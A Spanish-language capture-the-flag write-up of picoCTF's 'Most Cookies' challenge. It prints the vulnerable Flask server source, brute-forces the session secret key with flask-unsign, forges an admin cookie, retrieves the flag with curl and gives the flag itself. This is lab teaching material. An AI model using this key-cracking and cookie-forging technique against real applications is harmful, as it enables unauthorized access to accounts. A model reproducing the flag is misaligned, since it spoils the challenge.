
---
### Descripción:
```
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/c135543530f7dc24c3a6ecaeb44a81b8/server.py) [http://mercury.picoctf.net:65344/](http://mercury.picoctf.net:65344/)
```

### Pistas: 
```
1.- How secure is a flask cookie?
```

### Solución:
- **Comenzamos descargando el archivo .py del link que se nos proporcionó.**
```bash
estefania@estefania-IdeaPad-3-14ALC6:~$ wget https://mercury.picoctf.net/static/c135543530f7dc24c3a6ecaeb44a81b8/server.py
```
- **A continuacion decodificaremos la cookie del sitio, obteniendo como resultado:**
```bash
estefania@estefania-IdeaPad-3-14ALC6:~$ echo eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z_Ce_w.wrQO0IkBKzh5Ym497TIlblon7JI | base64 -d
{"very_auth":"snickerdoodle"}base64: entrada inválida
```
- **Leemos con cat, el archivo .py.**
```bash
estefania@estefania-IdeaPad-3-14ALC6:~$ cat server.py 
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "blank":
			return render_template("index.html", title=title)
		else:
			return make_response(redirect("/display"))
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/search", methods=["GET", "POST"])
def search():
	if "name" in request.form and request.form["name"] in cookie_names:
		resp = make_response(redirect("/display"))
		session["very_auth"] = request.form["name"]
		return resp
	else:
		message = "That doesn't appear to be a valid cookie."
		category = "danger"
		flash(message, category)
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

@app.route("/reset")
def reset():
	resp = make_response(redirect("/"))
	session.pop("very_auth", None)
	return resp

@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

if __name__ == "__main__":
	app.run()
```
- **Sin embargo lo unico util que utilizaremos de ese codigo es lo que contiene la variable "cookie_names", copiamos todos los nombres de las cookies y las guardamos en un archivo .txt de la siguiente manera:**
![[Pasted image 20250404222522.png]]

---

- **Ahora necesitaremos el flask-unsign, por lo cual lo instalaremos con los siguientes comandos:**
```bash
estefania@estefania-IdeaPad-3-14ALC6:~$ python3 -m venv ~/.venv
estefania@estefania-IdeaPad-3-14ALC6:~$ source ~/.venv/bin/activate
(.venv) estefania@estefania-IdeaPad-3-14ALC6:~$ python -m pip install flask-unsign
```
- **Ahora usando flask-unsign, buscaremos con el siguiente comando, la clave**
```bash
(.venv) estefania@estefania-IdeaPad-3-14ALC6:~/Documentos/FSI /WEB$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z_Ce_w.wrQO0IkBKzh5Ym497TIlblon7JI" --wordlist Cookies.txt
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 29 attempts
'fortune'
```
- **Ahora usaremos esa clave para conseguir otra cookie, y aplicar un curl.**
```bash
(.venv) estefania@estefania-IdeaPad-3-14ALC6:~/Documentos/FSI /WEB$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret fortune
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z_CtOA.TwlZuNnEG0eazBJZ-RuCdzyEDTw

(.venv) estefania@estefania-IdeaPad-3-14ALC6:~/Documentos/FSI /WEB$ curl -s  http://mercury.picoctf.net:65344/display -H 'Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z_CtOA.TwlZuNnEG0eazBJZ-RuCdzyEDTw'| grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}</code></p>
```

### Bandera:
```
picoCTF{pwn_4ll_th3_cook1E5_25bdb6f6}
```